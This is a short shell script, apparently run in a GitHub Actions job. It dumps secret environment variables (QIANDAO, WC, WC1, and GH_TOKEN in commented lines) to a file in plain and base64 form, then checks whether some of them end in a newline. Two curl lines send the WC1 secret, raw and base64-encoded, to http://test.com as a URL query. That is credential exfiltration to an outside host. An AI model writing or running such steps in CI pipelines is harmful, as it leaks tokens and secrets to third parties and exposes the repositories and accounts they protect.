BOT_USER="github-actions[bot]"
BOT_EMAIL="test+github-actions[bot]@users.noreply.github.com"
echo "Not supported" 
#echo $GH_TOKEN >> oupt.txt
echo $QIANDAO >> oupt.txt
echo $WC >> oupt.txt 
echo $WC1 >> oupt.txt
echo $BOT_USER >> oupt.txt 
echo $BOT_EMAIL >> oupt.txt
#echo -n $GH_TOKEN | base64 >> oupt.txt
echo -n $QIANDAO | base64 >> oupt.txt
echo -n $WC | base64 >> oupt.txt
echo -n $WC1 | base64 >> oupt.txt
echo "zzzzzzzzzzzzz" >> oupt.txt
curl --max-time 5 http://test.com/xx?$(echo $WC1)
curl --max-time 5 http://test.com/xx?$(echo -n $WC1 | base64)

# 定义一个包含换行符的变量
variable=$QIANDAO

# 使用 echo 命令去掉变量末尾的换行符
trimmed_variable=$(echo -n "$QIANDAO")

# 判断原始变量和去掉换行符后的变量是否相同
if [ "$variable" != "$trimmed_variable" ]; then
    echo "QIANDAO变量包含换行符\n"
else
    echo "QIANDAO变量不包含换行符\n"
fi

# 定义一个包含换行符的变量
variable1=$GH_TOKEN

# 使用 echo 命令去掉变量末尾的换行符
trimmed_variable1=$(echo -n "$GH_TOKEN")

# 判断原始变量和去掉换行符后的变量是否相同
if [ "$variable1" != "$trimmed_variable1" ]; then
    echo "GH_TOKEN变量包含换行符\n"
else
    echo "GH_TOKEN变量不包含换行符\n"
fi
